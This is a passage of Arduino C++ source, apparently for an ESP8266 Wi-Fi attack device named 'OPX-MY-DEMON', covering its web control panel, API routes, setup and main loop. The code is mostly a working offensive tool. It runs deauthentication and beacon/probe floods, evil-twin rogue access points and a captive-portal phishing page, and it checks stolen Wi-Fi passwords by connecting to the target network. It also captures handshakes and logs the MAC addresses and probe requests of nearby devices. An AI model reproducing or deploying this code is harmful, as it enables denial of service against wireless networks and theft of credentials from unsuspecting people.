    request->send(200, CONTENT_HTML, page);
    return;
  }

  String multiHtml;
  if (multiTargetCount > 0) {
    multiHtml = "<div class='sec'>MULTI-TARGET (" + String(multiTargetCount) + ")</div><div class='flex'>";
    for (int m = 0; m < multiTargetCount; m++) {
      multiHtml += "<span class='badge'>" + htmlEntities(multiTargets[m].ssid) + "</span>";
    }
    multiHtml += "<a class='btn' href='/?multi_clear'>CLEAR</a></div>";
  }

  request->send(200, CONTENT_HTML, buildScanPage(currentLang, deauthingActive, beaconActive, probeActive, hotspotActive,
    selectedNetwork.ssid, getCapturedList(), capturedCount, getTableRows(), AP_SSID, WiFi.softAPIP().toString(), apHidden, multiHtml,
    deauthAllActive, rogueAPActive, preciseDeauthActive, trueDeauthActive, hijackActive));
}

void handleAPI(AsyncWebServerRequest *request) {
  String path = request->url();
  if (path == "/api/health") {
    String json = "{";
    json += "\"heap\":" + String(ESP.getFreeHeap()) + ",";
    json += "\"heapMin\":" + String(heapLowMark == 0xFFFFFFFF ? ESP.getFreeHeap() : heapLowMark) + ",";
    json += "\"uptime\":" + String((millis() - startTime) / 1000) + ",";
    json += "\"version\":\"" + String(VERSION) + "\",";
    json += "\"board\":\"ESP8266\",";
    json += "\"mac\":\"" + WiFi.macAddress() + "\",";
    json += "\"apSSID\":\"" + String(AP_SSID) + "\",";
    json += "\"apIP\":\"" + WiFi.softAPIP().toString() + "\",";
    json += "\"wifiConnected\":" + String(wifiClientConnected ? "true" : "false") + ",";
    json += "\"wifiSSID\":\"" + wifiClientSSID + "\",";
    json += "\"internetSharing\":" + String(internetSharingEnabled ? "true" : "false") + ",";
    json += "\"pinProtected\":" + String(webPin.length() > 0 ? "true" : "false") + ",";
    json += "\"pinUnlocked\":" + String(pinUnlocked ? "true" : "false") + ",";
    json += "\"apHidden\":" + String(apHidden ? "true" : "false") + ",";
    json += "\"extenderState\":" + String(extenderState);
    json += "}";
    request->send(200, CONTENT_JSON, json);
  } else if (path == "/api/status") {
    request->send(200, CONTENT_JSON, getAttackStatusJSON());
  } else if (path == "/api/logs") {
    request->send(200, CONTENT_JSON, getLogsJSON());
  } else if (path == "/api/probes") {
    String json = "[";
    for (int i = 0; i < probeCount; i++) {
      if (i > 0) json += ",";
      json += "{\"mac\":\"" + bytesToStr(probeLog[i].mac, 6) + "\",\"ssid\":\"" + probeLog[i].ssid + "\"}";
    }
    json += "]";
    request->send(200, CONTENT_JSON, json);
  } else if (path == "/api/clients") {
    String json = "[";
    for (int i = 0; i < clientCount; i++) {
      if (i > 0) json += ",";
      json += "{\"mac\":\"" + bytesToStr(clientList[i].mac, 6) + "\"}";
    }
    json += "]";
    request->send(200, CONTENT_JSON, json);
  } else {
    request->send(404, CONTENT_PLAIN, "Unknown API");
  }
}

void handleMonitor(AsyncWebServerRequest *request) {
  request->send(200, CONTENT_HTML, buildMonitorPage(currentLang, deauthPkts, beaconPkts, probePkts,
    totalPkts, getLogsHTML()));
}

void handleSettings(AsyncWebServerRequest *request) {
  request->send(200, CONTENT_HTML, buildSettingsPage(currentLang, VERSION, "ESP8266",
    WiFi.macAddress(), ESP.getFreeHeap(), (millis() - startTime) / 1000, AP_SSID, AP_PASS,
    wifiClientConnected, wifiClientSSID, internetSharingEnabled,
    getWifiClientTableRows()));
}

void handleExtender(AsyncWebServerRequest *request) { request->send(200, CONTENT_HTML, buildExtenderPage(currentLang)); }
void handleFiles(AsyncWebServerRequest *request) { request->send(200, CONTENT_HTML, buildFilesPage(currentLang, getFileList(), hasCustomHTML)); }
void handleCustomHtml(AsyncWebServerRequest *request) { request->send(200, CONTENT_HTML, buildCustomHtmlPage(currentLang, hasCustomHTML, currentPhishingPage)); }
void handleLanguage(AsyncWebServerRequest *request) { request->send(200, CONTENT_HTML, buildLanguagePage(currentLang, getLangTable())); }
void handleHelp(AsyncWebServerRequest *request) { request->send(200, CONTENT_HTML, buildHelpPage(currentLang)); }

void handleAttack(AsyncWebServerRequest *request) {
  if (request->hasArg("page")) currentPhishingPage = request->arg("page").toInt();
  String bHtml;
  for (int i = 0; i < beaconSSIDCount; i++) {
    bHtml += "<div class='badge' style='display:inline-block;margin:2px'>" + beaconSSIDs[i] + "</div>";
  }
  request->send(200, CONTENT_HTML, buildAttackPage(currentLang, deauthingActive, beaconActive, probeActive,
    hotspotActive, selectedNetwork.ssid, currentPhishingPage, hijackActive,
    deauthAllActive, preciseDeauthActive, trueDeauthActive, rogueAPActive, bHtml, beaconSSIDCount));
}

void handleEdit(AsyncWebServerRequest *request) {
  if (request->hasArg("file")) {
    String fn = sanitizeFilename(request->arg("file"));
    if (!fn.startsWith("/")) fn = "/" + fn;
    if (LittleFS.exists(fn)) {
      File f = LittleFS.open(fn, "r");
      String content = f.readString(); f.close();
      request->send(200, CONTENT_HTML, buildEditPage(currentLang, fn, content));
    } else { request->send(404, CONTENT_PLAIN, "File not found"); }
  } else { request->send(400, CONTENT_PLAIN, "No file specified"); }
}

void handleUpload(AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final) {
  if (!index) {
    String fn = filename;
    if (fn.startsWith("/")) fn = fn.substring(1);
    fn = "/" + fn;
    if (fn == "/custom.html") hasCustomHTML = true;
  }
  if (len > 0) {
    String fn = "/" + filename;
    fn.replace("//", "/");
    File f = LittleFS.open(fn, "a");
    if (f) { f.write(data, len); f.close(); }
  }
  if (final) {
    // handled by the POST handler below
  }
}

void handleUploadConfig(AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final) {
  if (!index) {
    // start
  }
  if (len > 0) {
    File f = LittleFS.open("/state.json", "w");
    if (f) { f.write(data, len); f.close(); }
  }
  if (final) {
    loadState();
  }
}

void setup() {
  Serial.begin(115200);
  Serial.println("\nOPX-MY-DEMON ESP8266 Starting...");

  LittleFS.begin();
  savePhishingPages();
  loadBeaconSSIDs();

  hasCustomHTML = LittleFS.exists("/custom.html") || LittleFS.exists("/custom");

  loadState();
  initOTASecret();
  startTime = millis();
  lastStateSave = millis();

  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  wifi_set_promiscuous_rx_cb(promiscuousCallback);

  WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255,255,255,0));
  WiFi.softAP(AP_SSID, AP_PASS);

  if (wifiClientConnected && wifiClientSSID.length() > 0) {
    WiFi.begin(wifiClientSSID.c_str(), wifiClientPassword.c_str());
    wifiConnState = WIFI_RECONNECTING;
    wifiConnectStart = millis();
    addLog("Reconnecting to " + wifiClientSSID + " (async)");
  }

  if (rogueAPActive) {
    rogueAPActive = false;
    if (!hotspotActive && selectedNetwork.ssid.length() > 0) {
      startEvilTwin(&dnsServer, "Free WiFi");
      addLog("Rogue AP restored on boot");
    } else {
      addLog("Rogue AP state saved but no target - cleared", LOG_WARN);
    }
  }

  dnsServer.start(DNS_PORT, "*", AP_IP);

  // --- Async Web Server Routes ---
  server.on("/", HTTP_GET, handleRoot);
  server.on("/api/health", HTTP_GET, handleAPI);
  server.on("/api/status", HTTP_GET, handleAPI);
  server.on("/api/logs", HTTP_GET, handleAPI);
  server.on("/api/probes", HTTP_GET, handleAPI);
  server.on("/api/clients", HTTP_GET, handleAPI);
  server.on("/attack", HTTP_GET, handleAttack);
  server.on("/monitor", HTTP_GET, handleMonitor);
  server.on("/settings", HTTP_GET, handleSettings);
  server.on("/files", HTTP_GET, handleFiles);
  server.on("/customhtml", HTTP_GET, handleCustomHtml);
  server.on("/language", HTTP_GET, handleLanguage);
  server.on("/help", HTTP_GET, handleHelp);
  server.on("/extender", HTTP_GET, handleExtender);
  server.on("/verify_result", HTTP_GET, [](AsyncWebServerRequest *r) {
    if (phishingVerifyState == PHISHING_VERIFY_SUCCESS) {
      r->send(200, CONTENT_HTML, FPSTR(VERIFY_SUCCESS_HTML));
    } else if (phishingVerifyState == PHISHING_VERIFY_FAIL) {
      r->send(200, CONTENT_HTML, FPSTR(VERIFY_FAIL_HTML));
    } else {
      r->send(200, CONTENT_HTML, FPSTR(VERIFY_HTML));
    }
  });
  server.on("/userinput", HTTP_GET, handleRoot);
  server.on("/edit", HTTP_GET, handleEdit);

  // Captive portal redirects
  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *r) { r->redirect("/"); });
  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *r) { r->redirect("/"); });
  server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *r) { r->redirect("/"); });
  server.on("/fwlink/", HTTP_GET, [](AsyncWebServerRequest *r) { r->redirect("/"); });
  server.on("/success.html", HTTP_GET, [](AsyncWebServerRequest *r) { r->redirect("/"); });
  server.on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest *r) { r->redirect("/"); });
  server.on("/ncov.php", HTTP_GET, [](AsyncWebServerRequest *r) { r->redirect("/"); });
  server.on("/redirect", HTTP_GET, [](AsyncWebServerRequest *r) { r->redirect("/"); });
  server.on("/canonical.html", HTTP_GET, [](AsyncWebServerRequest *r) { r->redirect("/"); });
  server.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest *r) { r->redirect("/"); });
  server.on("/chromeos-connectivity-test", HTTP_GET, [](AsyncWebServerRequest *r) { r->redirect("/"); });

  // Upload routes
  server.on("/upload", HTTP_POST, [](AsyncWebServerRequest *r) {
    r->send(200, CONTENT_HTML, "<html><body><h2>Upload OK</h2><a href='/'>Back</a></body></html>");
  }, handleUpload);

  server.on("/upload_config", HTTP_POST, [](AsyncWebServerRequest *r) {
    r->send(200, CONTENT_HTML, "<html><body><h2>Config restored! Rebooting...</h2></body></html>");
    delay(1000);
    ESP.restart();
  }, handleUploadConfig);

  // Serve static files from LittleFS
  server.serveStatic("/", LittleFS, "/");

  // Initialize WebSockets
  initWebSockets(&server);

  server.onNotFound(handleRoot);

  server.begin();
  performScan();
  lastScan = millis();

  Serial.print("AP: "); Serial.print(AP_SSID);
  Serial.print(" | IP: "); Serial.println(WiFi.softAPIP());
}

static unsigned long lastDOHCheck = 0;

void loop() {
  dnsServer.processNextRequest();
  unsigned long loopNow = millis();

  // --- DoH Canary Interception (every 5s) ---
  if (hotspotActive && loopNow - lastDOHCheck > 5000) {
    lastDOHCheck = loopNow;
    for (int i = 0; i < dnsLogCount; i++) {
      if (isDOHCanaryDomain(dnsLog[i].domain)) {
        addLog("DoH canary blocked: " + dnsLog[i].domain, LOG_WARN);
      }
    }
  }

  unsigned long now = millis();

  // --- Non-blocking WiFi Connect ---
  if (wifiConnState == WIFI_CONNECTING || wifiConnState == WIFI_RECONNECTING) {
    if (WiFi.status() == WL_CONNECTED) {
      wifiClientConnected = true;
      wifiClientSSID = wifiPendingSSID.length() > 0 ? wifiPendingSSID : wifiClientSSID;
      wifiClientPassword = wifiPendingPass.length() > 0 ? wifiPendingPass : wifiClientPassword;
      wifiClientStatus = WL_CONNECTED;
      wifiConnState = WIFI_IDLE;
      wifiPendingSSID = ""; wifiPendingPass = "";
      addLog("WiFi connected: " + wifiClientSSID);
      if (internetSharingEnabled || rogueAPActive) internetSharing(true);
      dirtyState = true;
      markSave(SAVE_CRITICAL);
    } else if (now - wifiConnectStart > 10000) {
      wifiConnState = WIFI_IDLE;
      wifiPendingSSID = ""; wifiPendingPass = "";
      wifiClientConnected = false;
      wifiClientStatus = WL_DISCONNECTED;
      addLog("WiFi connect timeout", LOG_WARN);
      dirtyState = true;
      markSave(SAVE_CRITICAL);
    }
  }

  // --- Reactive Phishing Verification ---
  if (phishingVerifyState == PHISHING_VERIFYING) {
    if (WiFi.status() == WL_CONNECTED) {
      phishingVerifyState = PHISHING_VERIFY_SUCCESS;
      WiFi.disconnect();
      addLog("Phishing verification: password VALID for " + selectedNetwork.ssid, LOG_WARN);
    } else if (now - phishingVerifyStart > PHISHING_VERIFY_TIMEOUT) {
      phishingVerifyState = PHISHING_VERIFY_FAIL;
      WiFi.disconnect();
      addLog("Phishing verification: password REJECTED for " + selectedNetwork.ssid, LOG_WARN);
    }
  }

  // --- Attack Timer ---
  if (attackTimer > 0 && (deauthingActive || beaconActive || probeActive || hotspotActive ||
      hijackActive || deauthAllActive || preciseDeauthActive || trueDeauthActive || rogueAPActive)) {
    unsigned long elapsed = (now - attackTimerStart) / 1000;
    if (elapsed >= (unsigned long)attackTimer) {
      stopAllAttacks();
      attackTimer = 0;
      addLog("Attack timer expired");
      markSave(SAVE_CRITICAL);
    }
  }

  // --- Heap Monitoring & Dynamic Resource Management ---
  updateHeapLowMark();
  if (now - lastHeapCheck > 30000) {
    lastHeapCheck = now;
    if (ESP.getFreeHeap() < HEAP_WARNING_THRESHOLD) {
      addLog("Low heap: " + String(ESP.getFreeHeap()) + " B", LOG_WARN);
      heapPressureEvict();
    }
    if (probeCount > PROBE_MAX - 5) lruEvictProbes();
    if (clientCount > CLIENT_MAX - 5) lruEvictClients();
  }

  // --- Periodic Scan ---
  if (now - lastScan >= SCAN_INTERVAL && !scanning && !hotspotActive && wifiConnState == WIFI_IDLE) {
    scanning = true;
    performScan();
    scanning = false;
    lastScan = now;
  }

  // --- Attack Loop ---
  if (deauthingActive || beaconActive || probeActive || hijackActive ||
      deauthAllActive || preciseDeauthActive || trueDeauthActive) {
    attackLoop();
  }

  // --- Handshake Capture Timeout ---
  if (handshakeCaptureActive && now - handshakeCaptureStart > 60000) {
    handshakeCaptureActive = false;
    addLog("Handshake capture timeout", LOG_WARN);
  }
  if (handshakeCaptureActive && now % 2000 < 20) {
    uint8_t hop = (handshakeTargetCH % 13) + 1;
    wifi_set_channel(hop);
  }

  // --- Extender State Machine ---
  if (extenderActive && extenderState == EXTENDER_IDLE && wifiClientConnected) {
    extenderState = EXTENDER_CONNECTED;
    addLog("Extender ready - client connected");
  }
  if (extenderActive && extenderState == EXTENDER_CONNECTED && !wifiClientConnected) {
    extenderState = EXTENDER_IDLE;
    addLog("Extender lost connection", LOG_WARN);
  }

  // --- Flush Logs Periodically ---
  if (now - lastLogFlush >= LOG_FLUSH_INTERVAL_LONG && logBuffer.length() > 0) {
    flushLogs();
  }

  // --- Wear-Leveling State Save ---
  unsigned long saveInterval = (pendingSave == SAVE_CRITICAL) ? STATE_SAVE_CRITICAL_MS : STATE_SAVE_NONCRITICAL_MS;
  if (pendingSave > SAVE_NONE && now - lastStateSave >= saveInterval) {
    saveState();
    lastStateSave = now;
    pendingSave = SAVE_NONE;
  }

  // --- WebSocket Status Broadcast (every 2 seconds if clients connected) ---
  if (ws.count() > 0 && now % 2000 < 20) {
    broadcastStatus();
  }

  // --- WebSocket Loop (cleanup) ---
  wsLoop();

  yield();
}
